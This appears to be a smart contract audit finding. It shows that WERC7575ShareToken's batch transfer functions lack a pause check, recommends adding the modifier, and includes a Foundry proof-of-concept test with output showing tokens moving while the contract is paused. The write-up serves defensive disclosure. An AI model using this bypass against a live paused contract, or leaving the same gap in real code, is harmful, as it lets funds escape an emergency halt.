  "body": "## Vulnerability Details\n\n### Description\n\nThe WERC7575ShareToken contract implements a pause mechanism to halt token transfers during emergencies or security incidents. The standard `transfer` and `transferFrom` functions properly include the `whenNotPaused` modifier, ensuring they revert when the contract is paused. However, the `batchTransfers` and `rBatchTransfers` functions omit this critical modifier, allowing bulk token movements to continue even when the contract owner has explicitly paused the token.\n\nThe pause functionality exists as a safety mechanism for situations where token transfers must be immediately stopped, such as when a vulnerability is discovered, during protocol upgrades, or when suspicious activity is detected. By pausing the contract, administrators expect all token movement to cease until the situation is resolved. The batch transfer functions undermine this expectation entirely, as they provide an alternative pathway for moving tokens that remains operational regardless of the contract's paused state.\n\n### Impact\n\nThe impact is significant because the pause mechanism represents the protocol's last line of defense during security incidents. The `batchTransfers` function allows the validator to execute multiple transfers in a single transaction, moving tokens between arbitrary addresses. When the contract is paused, a compromised or malicious validator can still use these functions to move tokens, completely bypassing the emergency brake the protocol owner attempted to engage. This defeats the purpose of the pause functionality and could allow fund extraction during the critical window when administrators believe transfers have been halted. The inconsistency between single and batch transfer pause behavior also creates confusion about the contract's security guarantees.\n\n### Recommended Mitigation Steps\n\nBoth `batchTransfers` and `rBatchTransfers` functions should include the `whenNotPaused` modifier:\n\n```solidity\nfunction batchTransfers(...) external whenNotPaused returns (bool) { ... }\nfunction rBatchTransfers(...) external onlyOwner whenNotPaused returns (bool) { ... }\n```",
  "proof_of_concept": "## Proof of Concept\n\n**File:** `test/AuditReproduction.t.sol`\n\n**Run:** `forge test --match-test testMediumSeverity_BatchTransfersBypassesPause -vvv`\n\n```solidity\nfunction testMediumSeverity_BatchTransfersBypassesPause() public {\n    WERC7575ShareToken shareToken = new WERC7575ShareToken(\"Test Share\", \"TSH\");\n    WERC7575Vault vault = new WERC7575Vault(address(asset), shareToken);\n    shareToken.registerVault(address(asset), address(vault));\n    \n    uint256 validatorPk = 0xBEEF;\n    address validator = vm.addr(validatorPk);\n    shareToken.setValidator(validator);\n    \n    address alice = address(0xA11CE);\n    address bob = address(0xB0B);\n    shareToken.setKycVerified(alice, true);\n    shareToken.setKycVerified(bob, true);\n    \n    asset.mint(alice, 1000e18);\n    vm.startPrank(alice);\n    asset.approve(address(vault), 1000e18);\n    vault.deposit(1000e18, alice);\n    vm.stopPrank();\n    \n    // Alice sets self-allowance\n    uint256 nonce = shareToken.nonces(alice);\n    bytes32 structHash = keccak256(abi.encode(\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n        alice, alice, type(uint256).max, nonce, block.timestamp + 1 days\n    ));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n    shareToken.permit(alice, alice, type(uint256).max, block.timestamp + 1 days, v, r, s);\n    \n    // Owner pauses the contract\n    shareToken.pause();\n    console.log(\"Contract paused:\", shareToken.paused());\n    \n    // Normal transfer blocked\n    vm.prank(alice);\n    vm.expectRevert();\n    shareToken.transfer(bob, 100e18);\n    \n    // Batch transfer succeeds despite pause\n    address[] memory debtors = new address[](1);\n    address[] memory creditors = new address[](1);\n    uint256[] memory amounts = new uint256[](1);\n    debtors[0] = alice;\n    creditors[0] = bob;\n    amounts[0] = 500e18;\n    \n    vm.prank(validator);\n    bool success = shareToken.batchTransfers(debtors, creditors, amounts);\n    \n    console.log(\"batchTransfers succeeded while paused:\", success);\n    console.log(\"Alice shares after:\", shareToken.balanceOf(alice));\n    console.log(\"Bob shares after:\", shareToken.balanceOf(bob));\n    \n    assertTrue(success);\n    assertEq(shareToken.balanceOf(bob), 500e18);\n}\n```\n\n**Output:**\n```\n[PASS] testMediumSeverity_BatchTransfersBypassesPause()\nLogs:\n  Contract paused: true\n  batchTransfers succeeded while paused: true\n  Alice shares after: 500000000000000000000\n  Bob shares after: 500000000000000000000\n```",
